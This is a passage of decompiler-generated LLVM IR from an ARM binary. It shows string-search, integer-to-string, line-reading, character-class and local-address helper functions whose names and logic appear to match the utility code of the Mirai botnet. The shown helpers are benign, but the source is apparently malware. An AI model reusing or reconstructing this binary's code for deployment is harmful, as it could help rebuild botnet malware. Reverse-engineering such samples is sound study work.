  %accum_-20.0.ph = phi i32 [ %value, %dec_label_pc_19938 ], [ %v1_1996c.value, %dec_label_pc_19954 ]
  %v2_19a1c6 = icmp eq i32 %accum_-20.0.ph, 0
  br i1 %v2_19a1c6, label %dec_label_pc_19a24, label %dec_label_pc_1998c.preheader

dec_label_pc_1998c.preheader:                     ; preds = %dec_label_pc_19a18.preheader
  %v2_199e4 = add i32 %v13_198fc, -50
  br label %dec_label_pc_1998c

dec_label_pc_1998c:                               ; preds = %dec_label_pc_1998c.preheader, %dec_label_pc_1998c
  %accum_-20.08 = phi i32 [ %v2_1999c, %dec_label_pc_1998c ], [ %accum_-20.0.ph, %dec_label_pc_1998c.preheader ]
  %c_-28.07 = phi i32 [ %v1_19a10, %dec_label_pc_1998c ], [ 32, %dec_label_pc_1998c.preheader ]
  %v2_1999c = udiv i32 %accum_-20.08, %radix
  %v3_1999c = urem i32 %accum_-20.08, %radix
  %v8_199b0 = icmp sgt i32 %v3_1999c, 9
  %storemerge4.v = select i1 %v8_199b0, i32 55, i32 48
  %storemerge4 = add i32 %storemerge4.v, %v3_1999c
  %v2_199e8 = add i32 %v2_199e4, %c_-28.07
  %v1_199f0 = trunc i32 %storemerge4 to i8
  %v3_199f0 = inttoptr i32 %v2_199e8 to i8*
  store i8 %v1_199f0, i8* %v3_199f0, align 1
  %v1_19a10 = add i32 %c_-28.07, -1
  %v2_19a1c = icmp ult i32 %accum_-20.08, %radix
  br i1 %v2_19a1c, label %dec_label_pc_19a24, label %dec_label_pc_1998c

dec_label_pc_19a24:                               ; preds = %dec_label_pc_1998c, %dec_label_pc_19a18.preheader
  %c_-28.0.lcssa = phi i32 [ 32, %dec_label_pc_19a18.preheader ], [ %v1_19a10, %dec_label_pc_1998c ]
  %v2_19a28 = icmp eq i32 %offset_-32.0.ph, 0
  br i1 %v2_19a28, label %dec_label_pc_19a50, label %dec_label_pc_19a30

dec_label_pc_19a30:                               ; preds = %dec_label_pc_19a24
  %v2_19a3c = add i32 %v13_198fc, -50
  %v2_19a40 = add i32 %v2_19a3c, %c_-28.0.lcssa
  %v3_19a48 = inttoptr i32 %v2_19a40 to i8*
  store i8 45, i8* %v3_19a48, align 1
  br label %dec_label_pc_19a5c

dec_label_pc_19a50:                               ; preds = %dec_label_pc_19a24
  %v1_19a54 = add i32 %c_-28.0.lcssa, 1
  br label %dec_label_pc_19a5c

dec_label_pc_19a5c:                               ; preds = %dec_label_pc_19a30, %dec_label_pc_19a50
  %c_-28.1 = phi i32 [ %v1_19a54, %dec_label_pc_19a50 ], [ %c_-28.0.lcssa, %dec_label_pc_19a30 ]
  %v2_19a64 = ptrtoint [34 x i8]* %scratch_-66 to i32
  %v2_19a68 = add i32 %c_-28.1, %v2_19a64
  %v1_19a70 = inttoptr i32 %v2_19a68 to i8*
  %v6_19a74 = call i32 @util_strcpy(i8* nonnull %string, i8* %v1_19a70)
  br label %dec_label_pc_19a98

dec_label_pc_19a7c:                               ; preds = %dec_label_pc_1992c
  store i8 48, i8* %string, align 1
  %v1_19a8c = add i32 %tmp, 1
  %v3_19a94 = inttoptr i32 %v1_19a8c to i8*
  store i8 0, i8* %v3_19a94, align 1
  br label %dec_label_pc_19a98

dec_label_pc_19a98:                               ; preds = %dec_label_pc_19a5c, %dec_label_pc_19a7c
  %v2_19aac.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_19aa0

dec_label_pc_19aa0:                               ; preds = %dec_label_pc_19920, %dec_label_pc_19a98
  %v2_19aac = phi i32 [ %v2_19aac.pre, %dec_label_pc_19a98 ], [ %v3_198fc, %dec_label_pc_19920 ]
  %storemerge = phi i8* [ %string, %dec_label_pc_19a98 ], [ null, %dec_label_pc_19920 ]
  store i32 %v2_19aac, i32* @fp, align 4
  ret i8* %storemerge

; uselistorder directives
  uselistorder i32 %c_-28.0.lcssa, { 2, 1, 0 }
  uselistorder i32 %c_-28.07, { 1, 0 }
  uselistorder i32 %accum_-20.08, { 0, 2, 1 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i8*, i8*)* @util_strcpy, { 41, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 94, 93, 92, 91, 90, 42, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 89, 88, 87, 86, 85, 3, 2, 1, 0 }
  uselistorder i8* %string, { 1, 2, 0, 3, 4 }
  uselistorder i32 %value, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_19aa0, { 1, 0 }
  uselistorder label %dec_label_pc_19a98, { 1, 0 }
  uselistorder label %dec_label_pc_19a5c, { 1, 0 }
  uselistorder label %dec_label_pc_1998c, { 1, 0 }
}

define i32 @util_memsearch(i8* %buf, i32 %buf_len, i8* %mem, i32 %mem_len) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %mem to i32
  store i32 %buf_len, i32* @r1, align 4
  %tmp5 = ptrtoint i8* %buf to i32
  %stack_var_0 = alloca i32, align 4
  %v1_19ab4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_19ab4, i32* @ip, align 4
  %v7_19ae8 = icmp sgt i32 %mem_len, %buf_len
  br i1 %v7_19ae8, label %dec_label_pc_19aec, label %dec_label_pc_19b74.preheader

dec_label_pc_19b74.preheader:                     ; preds = %entry
  %v5_19b8026 = icmp sgt i32 %buf_len, 0
  br i1 %v5_19b8026, label %dec_label_pc_19b04, label %dec_label_pc_19b84

dec_label_pc_19aec:                               ; preds = %entry
  br label %dec_label_pc_19b8c

dec_label_pc_19b04:                               ; preds = %dec_label_pc_19b74.preheader, %dec_label_pc_19b68
  %storemerge228 = phi i32 [ %v1_19b6c, %dec_label_pc_19b68 ], [ 0, %dec_label_pc_19b74.preheader ]
  %matched_-20.127 = phi i32 [ %matched_-20.0, %dec_label_pc_19b68 ], [ 0, %dec_label_pc_19b74.preheader ]
  %v2_19b10 = add i32 %storemerge228, %tmp5
  %v1_19b14 = inttoptr i32 %v2_19b10 to i8*
  %v2_19b14 = load i8, i8* %v1_19b14, align 1
  %v3_19b14 = zext i8 %v2_19b14 to i32
  store i32 %v3_19b14, i32* @r1, align 4
  %v2_19b24 = add i32 %matched_-20.127, %tmp
  %v1_19b28 = inttoptr i32 %v2_19b24 to i8*
  %v2_19b28 = load i8, i8* %v1_19b28, align 1
  %v9_19b2c = icmp eq i8 %v2_19b14, %v2_19b28
  br i1 %v9_19b2c, label %dec_label_pc_19b34, label %dec_label_pc_19b60

dec_label_pc_19b34:                               ; preds = %dec_label_pc_19b04
  %v1_19b38 = add i32 %matched_-20.127, 1
  %v9_19b48 = icmp eq i32 %v1_19b38, %mem_len
  br i1 %v9_19b48, label %dec_label_pc_19b50, label %dec_label_pc_19b68

dec_label_pc_19b50:                               ; preds = %dec_label_pc_19b34
  %v1_19b54 = add i32 %storemerge228, 1
  br label %dec_label_pc_19b8c

dec_label_pc_19b60:                               ; preds = %dec_label_pc_19b04
  br label %dec_label_pc_19b68

dec_label_pc_19b68:                               ; preds = %dec_label_pc_19b34, %dec_label_pc_19b60
  %matched_-20.0 = phi i32 [ %v1_19b38, %dec_label_pc_19b34 ], [ 0, %dec_label_pc_19b60 ]
  %v1_19b6c = add nuw nsw i32 %storemerge228, 1
  %v5_19b80 = icmp slt i32 %v1_19b6c, %buf_len
  br i1 %v5_19b80, label %dec_label_pc_19b04, label %dec_label_pc_19b84

dec_label_pc_19b84:                               ; preds = %dec_label_pc_19b68, %dec_label_pc_19b74.preheader
  br label %dec_label_pc_19b8c

dec_label_pc_19b8c:                               ; preds = %dec_label_pc_19b50, %dec_label_pc_19aec, %dec_label_pc_19b84
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_19aec ], [ %v1_19b54, %dec_label_pc_19b50 ], [ -1, %dec_label_pc_19b84 ]
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %v1_19b6c, { 1, 0 }
  uselistorder i32 %storemerge228, { 1, 0, 2 }
  uselistorder i32 %buf_len, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_19b8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19b68, { 1, 0 }
  uselistorder label %dec_label_pc_19b04, { 1, 0 }
}

define i32 @util_stristr(i8* %haystack, i32 %haystack_len, i8* %str) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %str to i32
  %tmp10 = ptrtoint i8* %haystack to i32
  %v3_19ba4 = load i32, i32* @fp, align 4
  %v3_19bc8 = call i32 @util_strlen(i8* %str)
  br label %dec_label_pc_19cd8

dec_label_pc_19be0:                               ; preds = %dec_label_pc_19cd8
  %v1_19be4 = inttoptr i32 %str_len_-32.0 to i8*
  %v2_19be4 = load i8, i8* %v1_19be4, align 1
  %v1_19bf0 = add i32 %str_len_-32.0, 1
  %v2_19c04 = add i32 %match_count_-24.0, %tmp
  %v1_19c08 = inttoptr i32 %v2_19c04 to i8*
  %v2_19c08 = load i8, i8* %v1_19c08, align 1
  %tmp30 = icmp ult i8 %v2_19be4, 65
  br i1 %tmp30, label %dec_label_pc_19c3c, label %dec_label_pc_19c1c

dec_label_pc_19c1c:                               ; preds = %dec_label_pc_19be0
  %tmp31 = icmp ugt i8 %v2_19be4, 90
  br i1 %tmp31, label %dec_label_pc_19c3c, label %dec_label_pc_19c28

dec_label_pc_19c28:                               ; preds = %dec_label_pc_19c1c
  %v1_19c2c = or i8 %v2_19be4, 96
  br label %dec_label_pc_19c44

dec_label_pc_19c3c:                               ; preds = %dec_label_pc_19c1c, %dec_label_pc_19be0
  br label %dec_label_pc_19c44

dec_label_pc_19c44:                               ; preds = %dec_label_pc_19c28, %dec_label_pc_19c3c
  %storemerge6 = phi i8 [ %v2_19be4, %dec_label_pc_19c3c ], [ %v1_19c2c, %dec_label_pc_19c28 ]
  %tmp32 = icmp ult i8 %v2_19c08, 65
  br i1 %tmp32, label %dec_label_pc_19c7c, label %dec_label_pc_19c5c

dec_label_pc_19c5c:                               ; preds = %dec_label_pc_19c44
  %tmp33 = icmp ugt i8 %v2_19c08, 90
  br i1 %tmp33, label %dec_label_pc_19c7c, label %dec_label_pc_19c68

dec_label_pc_19c68:                               ; preds = %dec_label_pc_19c5c
  %v1_19c6c = or i8 %v2_19c08, 96
  br label %dec_label_pc_19c84

dec_label_pc_19c7c:                               ; preds = %dec_label_pc_19c5c, %dec_label_pc_19c44
  br label %dec_label_pc_19c84

dec_label_pc_19c84:                               ; preds = %dec_label_pc_19c68, %dec_label_pc_19c7c
  %storemerge5 = phi i8 [ %v2_19c08, %dec_label_pc_19c7c ], [ %v1_19c6c, %dec_label_pc_19c68 ]
  %v9_19c98 = icmp eq i8 %storemerge6, %storemerge5
  br i1 %v9_19c98, label %dec_label_pc_19ca0, label %dec_label_pc_19cd0

dec_label_pc_19ca0:                               ; preds = %dec_label_pc_19c84
  %v1_19ca4 = add i32 %match_count_-24.0, 1
  %v9_19cb4 = icmp eq i32 %v1_19ca4, %v3_19bc8
  br i1 %v9_19cb4, label %dec_label_pc_19cbc, label %dec_label_pc_19cd8

dec_label_pc_19cbc:                               ; preds = %dec_label_pc_19ca0
  %v2_19cc4 = sub i32 %v1_19bf0, %tmp10
  br label %dec_label_pc_19d08

dec_label_pc_19cd0:                               ; preds = %dec_label_pc_19c84
  br label %dec_label_pc_19cd8

dec_label_pc_19cd8:                               ; preds = %dec_label_pc_19ca0, %dec_label_pc_19cd0, %entry
  %str_len_-32.0 = phi i32 [ %tmp10, %entry ], [ %v1_19bf0, %dec_label_pc_19cd0 ], [ %v1_19bf0, %dec_label_pc_19ca0 ]
  %match_count_-24.0 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_19cd0 ], [ %v1_19ca4, %dec_label_pc_19ca0 ]
  %stack_var_-40.0 = phi i32 [ %haystack_len, %entry ], [ %v1_19cf0, %dec_label_pc_19cd0 ], [ %v1_19cf0, %dec_label_pc_19ca0 ]
  %tmp27 = icmp slt i32 %stack_var_-40.0, 1
  %v1_19cf0 = add i32 %stack_var_-40.0, -1
  br i1 %tmp27, label %dec_label_pc_19d00, label %dec_label_pc_19be0

dec_label_pc_19d00:                               ; preds = %dec_label_pc_19cd8
  br label %dec_label_pc_19d08

dec_label_pc_19d08:                               ; preds = %dec_label_pc_19cbc, %dec_label_pc_19d00
  %storemerge = phi i32 [ %v2_19cc4, %dec_label_pc_19cbc ], [ -1, %dec_label_pc_19d00 ]
  store i32 %v3_19ba4, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_19cf0, { 1, 0 }
  uselistorder i32 %str_len_-32.0, { 1, 0 }
  uselistorder i8 %v2_19c08, { 3, 0, 1, 2 }
  uselistorder i8 %v2_19be4, { 3, 0, 1, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 62, 61, 60, 59, 58, 57, 87, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 4, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_19d08, { 1, 0 }
  uselistorder label %dec_label_pc_19cd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19c84, { 1, 0 }
  uselistorder label %dec_label_pc_19c44, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %addr_-40 = alloca i32, align 4
  %addr_-36 = alloca i32, align 4
  store i32 16, i32* %addr_-40, align 4
  %v0_19d34 = call i32 @__GI___errno_location()
  %v2_19d40 = inttoptr i32 %v0_19d34 to i32*
  store i32 0, i32* %v2_19d40, align 4
  %v3_19d50 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_19d60 = icmp eq i32 %v3_19d50, -1
  br i1 %v3_19d60, label %dec_label_pc_19ddc, label %dec_label_pc_19d74

dec_label_pc_19d74:                               ; preds = %entry
  store i32 2, i32* %addr_-36, align 4
  %v1_19d88 = call i32 @__GI_htonl(i32 134744072)
  %v1_19d98 = call i32 @__GI_htons(i32 53)
  %v2_19da4 = ptrtoint i32* %addr_-36 to i32
  %v3_19db4 = call i32 @__libc_connect(i32 %v3_19d50, i32 %v2_19da4, i32 16)
  %v2_19dbc = ptrtoint i32* %addr_-40 to i32
  store i32 %v2_19da4, i32* @r1, align 4
  %v4_19dc8 = call i32 @__GI_getsockname(i32 %v3_19d50, i32 %v2_19da4, i32 %v2_19dbc, i32 %v2_19da4)
  %v1_19dd0 = call i32 @__GI___libc_close(i32 %v3_19d50)
  br label %dec_label_pc_19ddc

dec_label_pc_19ddc:                               ; preds = %entry, %dec_label_pc_19d74
  %storemerge = phi i32 [ %v1_19d88, %dec_label_pc_19d74 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_19da4, { 0, 2, 1, 3 }
  uselistorder i32* %addr_-36, { 1, 0 }
  uselistorder i32* %addr_-40, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 3, 9, 2, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder i32 (i32)* @__GI_htons, { 18, 17, 15, 14, 13, 12, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 16, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 11, 0 }
  uselistorder i32 (i32)* @__GI_htonl, { 5, 17, 4, 3, 16, 14, 15, 13, 21, 20, 19, 18, 12, 11, 10, 9, 8, 7, 6, 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 4, 19, 3, 2, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 ()* @__GI___errno_location, { 15, 14, 13, 12, 11, 10, 9, 8, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_19ddc, { 1, 0 }
}

define i8* @util_fdgets(i8* %buffer, i32 %buffer_size, i32 %fd) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %buffer to i32
  %v1_19e90 = add i32 %tmp, -1
  br label %dec_label_pc_19e1c

dec_label_pc_19e1c:                               ; preds = %dec_label_pc_19e8c, %entry
  %total_-20.0 = phi i32 [ 0, %entry ], [ %storemerge2, %dec_label_pc_19e8c ]
  %v2_19e28 = add i32 %total_-20.0, %tmp
  store i32 %v2_19e28, i32* @r3, align 4
  store i32 %v2_19e28, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_19e38 = call i32 @__libc_read(i32 %fd)
  %v7_19e48 = icmp eq i32 %v1_19e38, 1
  %v1_19e54 = zext i1 %v7_19e48 to i32
  %storemerge2 = add i32 %v1_19e54, %total_-20.0
  br i1 %v7_19e48, label %dec_label_pc_19e7c, label %dec_label_pc_19ea8

dec_label_pc_19e7c:                               ; preds = %dec_label_pc_19e1c
  %v6_19e88 = icmp slt i32 %storemerge2, %buffer_size
  br i1 %v6_19e88, label %dec_label_pc_19e8c, label %dec_label_pc_19ea8

dec_label_pc_19e8c:                               ; preds = %dec_label_pc_19e7c
  %v2_19e98 = add i32 %storemerge2, %v1_19e90
  %v1_19e9c = inttoptr i32 %v2_19e98 to i8*
  %v2_19e9c = load i8, i8* %v1_19e9c, align 1
  %v7_19ea0 = icmp eq i8 %v2_19e9c, 10
  br i1 %v7_19ea0, label %dec_label_pc_19ea8, label %dec_label_pc_19e1c

dec_label_pc_19ea8:                               ; preds = %dec_label_pc_19e8c, %dec_label_pc_19e7c, %dec_label_pc_19e1c
  %v2_19eac = icmp eq i32 %storemerge2, 0
  %.buffer = select i1 %v2_19eac, i8* null, i8* %buffer
  ret i8* %.buffer

; uselistorder directives
  uselistorder i8* null, { 2, 5, 6, 7, 0, 1, 8, 9, 10, 11, 12, 13, 14, 15, 3, 16, 17, 4, 18, 19, 20 }
}

define i32 @util_isupper(i8 %c) local_unnamed_addr {
entry:
  %tmp = icmp ult i8 %c, 65
  br i1 %tmp, label %dec_label_pc_19f18, label %dec_label_pc_19f00

dec_label_pc_19f00:                               ; preds = %entry
  %tmp9 = icmp ugt i8 %c, 90
  br i1 %tmp9, label %dec_label_pc_19f18, label %dec_label_pc_19f20

dec_label_pc_19f18:                               ; preds = %dec_label_pc_19f00, %entry
  br label %dec_label_pc_19f20

dec_label_pc_19f20:                               ; preds = %dec_label_pc_19f00, %dec_label_pc_19f18
  %storemerge1 = phi i32 [ 0, %dec_label_pc_19f18 ], [ 1, %dec_label_pc_19f00 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_19f20, { 1, 0 }
}

define i32 @util_isalpha(i8 %c) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_19f34 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_19f34, i32* @ip, align 4
  %tmp = icmp ult i8 %c, 65
  br i1 %tmp, label %dec_label_pc_19f64, label %dec_label_pc_19f58

dec_label_pc_19f58:                               ; preds = %entry
  %tmp9 = icmp ult i8 %c, 91
  br i1 %tmp9, label %dec_label_pc_19f90, label %dec_label_pc_19f64

dec_label_pc_19f64:                               ; preds = %dec_label_pc_19f58, %entry
  %tmp10 = icmp ult i8 %c, 97
  br i1 %tmp10, label %dec_label_pc_19f88, label %dec_label_pc_19f70

dec_label_pc_19f70:                               ; preds = %dec_label_pc_19f64
  %tmp11 = icmp ugt i8 %c, 122
  br i1 %tmp11, label %dec_label_pc_19f88, label %dec_label_pc_19f90

dec_label_pc_19f88:                               ; preds = %dec_label_pc_19f70, %dec_label_pc_19f64
  br label %dec_label_pc_19f90

dec_label_pc_19f90:                               ; preds = %dec_label_pc_19f58, %dec_label_pc_19f70, %dec_label_pc_19f88
  %storemerge1 = phi i32 [ 0, %dec_label_pc_19f88 ], [ 1, %dec_label_pc_19f70 ], [ 1, %dec_label_pc_19f58 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_19f90, { 2, 1, 0 }
}

define i32 @util_isspace(i8 %c) local_unnamed_addr {
entry:
  %v7_19fc0 = icmp eq i8 %c, 32
  br i1 %v7_19fc0, label %dec_label_pc_1a000, label %dec_label_pc_19fc8

dec_label_pc_19fc8:                               ; preds = %entry
  %v7_19fcc = icmp eq i8 %c, 9
  br i1 %v7_19fcc, label %dec_label_pc_1a000, label %dec_label_pc_19fd4

dec_label_pc_19fd4:                               ; preds = %dec_label_pc_19fc8
  %v7_19fd8 = icmp eq i8 %c, 10
  br i1 %v7_19fd8, label %dec_label_pc_1a000, label %dec_label_pc_19fe0

dec_label_pc_19fe0:                               ; preds = %dec_label_pc_19fd4
  br label %dec_label_pc_1a000

dec_label_pc_1a000:                               ; preds = %dec_label_pc_19fe0, %entry, %dec_label_pc_19fc8, %dec_label_pc_19fd4
  %storemerge1 = phi i32 [ 1, %dec_label_pc_19fd4 ], [ 1, %dec_label_pc_19fc8 ], [ 1, %entry ], [ 0, %dec_label_pc_19fe0 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i8 9, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i8 32, { 1, 2, 0, 4, 3, 5, 6, 7, 8, 12, 13, 14, 11, 15, 16, 17, 9, 10 }
  uselistorder label %dec_label_pc_1a000, { 0, 3, 2, 1 }
}

define i32 @util_isdigit(i8 %c) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_1a014 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_1a014, i32* @ip, align 4
  %tmp = icmp ult i8 %c, 48
  br i1 %tmp, label %dec_label_pc_1a050, label %dec_label_pc_1a038

dec_label_pc_1a038:                               ; preds = %entry
  %tmp9 = icmp ugt i8 %c, 57
  br i1 %tmp9, label %dec_label_pc_1a050, label %dec_label_pc_1a058

dec_label_pc_1a050:                               ; preds = %dec_label_pc_1a038, %entry
  br label %dec_label_pc_1a058

dec_label_pc_1a058:                               ; preds = %dec_label_pc_1a038, %dec_label_pc_1a050
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1a050 ], [ 1, %dec_label_pc_1a038 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_1a058, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1a06c = load i32, i32* @r1, align 4
  %v1_1a06c = add i32 %v0_1a06c, -1
  store i32 %v1_1a06c, i32* %r2.global-to-local, align 4
  %v2_1a06c = icmp eq i32 %v0_1a06c, 0
  %v7_1a06c = icmp eq i32 %v0_1a06c, 1
  %v0_1a070 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_1a06c, i32 %v0_1a070)
  br i1 %v2_1a06c, label %dec_label_pc_1a154, label %dec_label_pc_1a078

dec_label_pc_1a078:                               ; preds = %entry
  %v0_1a078 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a078 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_1a078, %v1_1a078
  br i1 %tmp, label %dec_label_pc_1a080, label %dec_label_pc_1a10c

dec_label_pc_1a080:                               ; preds = %dec_label_pc_1a078
  %v1_1a080 = load i32, i32* %r2.global-to-local, align 4
  %v2_1a080 = and i32 %v1_1a080, %v1_1a078
  %v4_1a080 = icmp eq i32 %v2_1a080, 0
  br i1 %v4_1a080, label %dec_label_pc_1a118, label %dec_label_pc_1a088

dec_label_pc_1a088:                               ; preds = %dec_label_pc_1a080
  %v3_1a088 = icmp ult i32 %v1_1a078, 536870912
  br i1 %v3_1a088, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1a088
  %v4_1a08c = mul i32 %v1_1a078, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1a088, %.thread
  %v0_1a0ac.pr36.ph = phi i32 [ %v4_1a08c, %.thread ], [ %v1_1a078, %dec_label_pc_1a088 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1a088 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_1a0ac.pr36 = phi i32 [ %v4_1a0a0, %bb81 ], [ %v0_1a0ac.pr36.ph, %.preheader.preheader ]
  %v1_1a0a4 = phi i32 [ %v4_1a0a4, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_1a098 = icmp ugt i32 %v0_1a0ac.pr36, 268435455
  br i1 %v2_1a098, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_1a0acthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_1a09c = icmp ult i32 %v0_1a0ac.pr36, %v0_1a078
  br i1 %v4_1a09c, label %bb80, label %dec_label_pc_1a0acthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_1a0a0 = and i32 %v0_1a0ac.pr36, 268435456
  %v3_1a0a0 = icmp eq i32 %v2_1a0a0, 0
  %v4_1a0a0 = mul i32 %v0_1a0ac.pr36, 16
  br i1 %v3_1a0a0, label %bb81, label %dec_label_pc_1a0ac.loopexit

bb81:                                             ; preds = %bb80
  %v2_1a0a4 = and i32 %v1_1a0a4, 268435456
  %v3_1a0a4 = icmp eq i32 %v2_1a0a4, 0
  %v4_1a0a4 = mul i32 %v1_1a0a4, 16
  br i1 %v3_1a0a4, label %.preheader, label %dec_label_pc_1a0acthread-pre-split.loopexit.loopexit

dec_label_pc_1a0acthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1a0b848.ph = phi i32 [ %v1_1a0a4, %bb ], [ %v4_1a0a4, %bb81 ]
  %v0_1a0ac.pr38.ph = phi i32 [ %v0_1a0ac.pr36, %bb ], [ %v4_1a0a0, %bb81 ]
  br label %dec_label_pc_1a0acthread-pre-split.loopexit

dec_label_pc_1a0acthread-pre-split.loopexit:      ; preds = %dec_label_pc_1a0acthread-pre-split.loopexit.loopexit, %.thread2
  %v1_1a0b848 = phi i32 [ %v1_1a0a4, %.thread2 ], [ %v1_1a0b848.ph, %dec_label_pc_1a0acthread-pre-split.loopexit.loopexit ]
  %v0_1a0ac.pr38 = phi i32 [ %v0_1a0ac.pr36, %.thread2 ], [ %v0_1a0ac.pr38.ph, %dec_label_pc_1a0acthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1a0acthread-pre-split

dec_label_pc_1a0acthread-pre-split:               ; preds = %dec_label_pc_1a0acthread-pre-split.loopexit, %bb83
  %v1_1a0b846 = phi i32 [ %v1_1a0b848, %dec_label_pc_1a0acthread-pre-split.loopexit ], [ %v3_1a0b8, %bb83 ]
  %v0_1a0ac.pr = phi i32 [ %v0_1a0ac.pr38, %dec_label_pc_1a0acthread-pre-split.loopexit ], [ %v3_1a0b4, %bb83 ]
  br label %dec_label_pc_1a0ac

dec_label_pc_1a0ac.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_1a0ac

dec_label_pc_1a0ac:                               ; preds = %dec_label_pc_1a0ac.loopexit, %dec_label_pc_1a0acthread-pre-split
  %v1_1a0b8 = phi i32 [ %v1_1a0b846, %dec_label_pc_1a0acthread-pre-split ], [ %v1_1a0a4, %dec_label_pc_1a0ac.loopexit ]
  %v1_1a0b4 = phi i32 [ %v0_1a0ac.pr, %dec_label_pc_1a0acthread-pre-split ], [ %v4_1a0a0, %dec_label_pc_1a0ac.loopexit ]
  %v2_1a0ac = icmp slt i32 %v1_1a0b4, 0
  br i1 %v2_1a0ac, label %dec_label_pc_1a0c0, label %bb82

bb82:                                             ; preds = %dec_label_pc_1a0ac
  %v4_1a0b0 = icmp ult i32 %v1_1a0b4, %v0_1a078
  br i1 %v4_1a0b0, label %bb83, label %dec_label_pc_1a0c0

bb83:                                             ; preds = %bb82
  %v3_1a0b4 = mul i32 %v1_1a0b4, 2
  %v2_1a0b8 = icmp slt i32 %v1_1a0b8, 0
  %v3_1a0b8 = mul i32 %v1_1a0b8, 2
  br i1 %v2_1a0b8, label %dec_label_pc_1a0c0, label %dec_label_pc_1a0acthread-pre-split

dec_label_pc_1a0c0:                               ; preds = %bb82, %dec_label_pc_1a0ac, %bb83
  %v2_1a0cc59 = phi i32 [ %v3_1a0b8, %bb83 ], [ %v1_1a0b8, %bb82 ], [ %v1_1a0b8, %dec_label_pc_1a0ac ]
